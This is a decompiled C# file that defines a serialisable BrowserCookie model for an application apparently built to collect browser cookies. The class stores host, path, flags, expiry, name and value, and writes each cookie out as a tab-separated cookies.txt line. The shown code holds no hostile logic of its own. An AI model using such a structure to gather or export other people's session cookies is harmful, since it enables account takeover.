using System;
using System.Collections.Generic;
using System.ComponentModel;
using ProtoBuf;

namespace NoiseMe.Drags.App.Models.Common
{
	// Token: 0x0200015F RID: 351
	[ProtoContract(Name = "BrowserCookie")]
	public class BrowserCookie : INotifyPropertyChanged, IEqualityComparer<BrowserCookie>
	{
		// Token: 0x170002BA RID: 698
		// (get) Token: 0x06000B24 RID: 2852 RVA: 0x000088BC File Offset: 0x00006ABC
		// (set) Token: 0x06000B25 RID: 2853 RVA: 0x000088C4 File Offset: 0x00006AC4
		[ProtoMember(1, Name = "Host")]
		public string Host
		{
			get
			{
				return this._host;
			}
			set
			{
				this._host = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Host"));
			}
		}

		// Token: 0x170002BB RID: 699
		// (get) Token: 0x06000B26 RID: 2854 RVA: 0x000088E8 File Offset: 0x00006AE8
		// (set) Token: 0x06000B27 RID: 2855 RVA: 0x000088F0 File Offset: 0x00006AF0
		[ProtoMember(2, Name = "Http")]
		public bool Http
		{
			get
			{
				return this._http;
			}
			set
			{
				this._http = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Http"));
			}
		}

		// Token: 0x170002BC RID: 700
		// (get) Token: 0x06000B28 RID: 2856 RVA: 0x00008914 File Offset: 0x00006B14
		// (set) Token: 0x06000B29 RID: 2857 RVA: 0x0000891C File Offset: 0x00006B1C
		[ProtoMember(3, Name = "Path")]
		public string Path
		{
			get
			{
				return this._path;
			}
			set
			{
				this._path = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Path"));
			}
		}

		// Token: 0x170002BD RID: 701
		// (get) Token: 0x06000B2A RID: 2858 RVA: 0x00008940 File Offset: 0x00006B40
		// (set) Token: 0x06000B2B RID: 2859 RVA: 0x00008948 File Offset: 0x00006B48
		[ProtoMember(4, Name = "Secure")]
		public bool Secure
		{
			get
			{
				return this._secure;
			}
			set
			{
				this._secure = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Secure"));
			}
		}

		// Token: 0x170002BE RID: 702
		// (get) Token: 0x06000B2C RID: 2860 RVA: 0x0000896C File Offset: 0x00006B6C
		// (set) Token: 0x06000B2D RID: 2861 RVA: 0x00008974 File Offset: 0x00006B74
		[ProtoMember(5, Name = "Expires")]
		public string Expires
		{
			get
			{
				return this._expires;
			}
			set
			{
				this._expires = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Expires"));
			}
		}

		// Token: 0x170002BF RID: 703
		// (get) Token: 0x06000B2E RID: 2862 RVA: 0x00008998 File Offset: 0x00006B98
		// (set) Token: 0x06000B2F RID: 2863 RVA: 0x000089A0 File Offset: 0x00006BA0
		[ProtoMember(6, Name = "Name")]
		public string Name
		{
			get
			{
				return this._name;
			}
			set
			{
				this._name = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Name"));
			}
		}

		// Token: 0x170002C0 RID: 704
		// (get) Token: 0x06000B30 RID: 2864 RVA: 0x000089C4 File Offset: 0x00006BC4
		// (set) Token: 0x06000B31 RID: 2865 RVA: 0x000089CC File Offset: 0x00006BCC
		[ProtoMember(7, Name = "Value")]
		public string Value
		{
			get
			{
				return this._value;
			}
			set
			{
				this._value = value;
				PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
				if (propertyChanged == null)
				{
					return;
				}
				propertyChanged(this, new PropertyChangedEventArgs("Value"));
			}
		}

		// Token: 0x1400001B RID: 27
		// (add) Token: 0x06000B32 RID: 2866 RVA: 0x00022A78 File Offset: 0x00020C78
		// (remove) Token: 0x06000B33 RID: 2867 RVA: 0x00022AB0 File Offset: 0x00020CB0
		public event PropertyChangedEventHandler PropertyChanged;

		// Token: 0x06000B34 RID: 2868 RVA: 0x00022AE8 File Offset: 0x00020CE8
		public override string ToString()
		{
			return string.Join("\t", new string[]
			{
				this.Host,
				this.Http.ToString().ToUpper(),
				this.Path,
				this.Secure.ToString().ToUpper(),
				this.Expires,
				this.Name,
				this.Value
			});
		}

		// Token: 0x06000B35 RID: 2869 RVA: 0x00022B60 File Offset: 0x00020D60
		public bool Equals(BrowserCookie x, BrowserCookie y)
		{
			return x.Name == y.Name && x.Host == y.Host && x.Path == y.Path && x.Value == y.Value;
		}

		// Token: 0x06000B36 RID: 2870 RVA: 0x00022BBC File Offset: 0x00020DBC
		public int GetHashCode(BrowserCookie obj)
		{
			int num = 37;
			num *= 397;
			if (!string.IsNullOrEmpty(obj.Name))
			{
				num += obj.Name.GetHashCode();
			}
			if (!string.IsNullOrEmpty(obj.Host))
			{
				num += obj.Host.GetHashCode();
			}
			if (!string.IsNullOrEmpty(obj.Path))
			{
				num += obj.Path.GetHashCode();
			}
			if (!string.IsNullOrEmpty(obj.Value))
			{
				num += obj.Value.GetHashCode();
			}
			return num;
		}

		// Token: 0x04000446 RID: 1094
		private string _value;

		// Token: 0x04000447 RID: 1095
		private string _name;

		// Token: 0x04000448 RID: 1096
		private string _expires;

		// Token: 0x04000449 RID: 1097
		private bool _secure;

		// Token: 0x0400044A RID: 1098
		private string _path;

		// Token: 0x0400044B RID: 1099
		private bool _http;

		// Token: 0x0400044C RID: 1100
		private string _host;
	}
}
